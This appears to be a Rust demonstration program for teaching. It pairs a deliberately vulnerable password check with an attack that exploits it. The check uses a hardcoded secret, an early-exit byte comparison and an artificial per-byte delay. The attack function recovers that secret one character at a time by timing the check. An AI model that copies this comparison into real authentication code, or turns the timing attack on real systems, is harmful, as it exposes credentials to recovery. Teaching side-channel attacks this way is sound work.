// AUTHORS - Carter, Estelle
use std::thread;
use std::time::{Duration, Instant};

const SECRET: &str = "Pa55word123";

/// Checks a password attempt against SECRET using byte-by-byte comparison.
/// Vulnerable to timing attacks due to early exit and per-character delay.
fn vulnerable_check_password (attempt: &str) -> bool {
    if attempt.len() != SECRET.len() {
        return false;
    }   

    let attempt_bytes: &[u8] = attempt.as_bytes();
    let secret_bytes: &[u8] = SECRET.as_bytes();

    for i in 0..attempt.len() {
        if attempt_bytes[i] != secret_bytes[i] {
            return false;
        }
        // Artificial delay to exaggerate the timing side-channel
        thread::sleep(Duration::from_millis(9));
    }

    true
}   

/// Exploits the timing side-channel in `vulnerable_check_password` to recover
/// the secret one character at a time.
fn attack() {
    let charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    let mut current_attempt = String::new();

    for i in 0..SECRET.len() {
        let mut longest_duration = Duration::new(0, 0);
        let mut probable_char: Option<char> = None;
        
        println!("Position {}...", i);

        for candidate in charset.chars() {
            // Build a full-length guess: known prefix + candidate + padding
            let mut attempt = current_attempt.clone();
            attempt.push(candidate);
            while attempt.len() < SECRET.len() {
                attempt.push('A'); 
            }
            
            // Measure how long the check takes
            let start = Instant::now();
            vulnerable_check_password(&attempt);
            let duration = start.elapsed();

            // A longer duration means more characters matched
            if duration > longest_duration {
                longest_duration = duration;
                probable_char = Some(candidate);
            }
        }

        let best_char = probable_char.unwrap();
        current_attempt.push(best_char);

        println!(
            "  FOUND: '{}' (Time: {:?}) -> Current Guess: {}", 
            best_char, longest_duration, current_attempt
        );
    }

    // Verify the recovered password
    println!("\nFinal Result:");
    if vulnerable_check_password(&current_attempt) {
        println!("SUCCESS! The password is '{}'", current_attempt);
    } else {
        println!("FAILED. Best guess was '{}'", current_attempt);
    }
}   

fn main() {
    attack();
}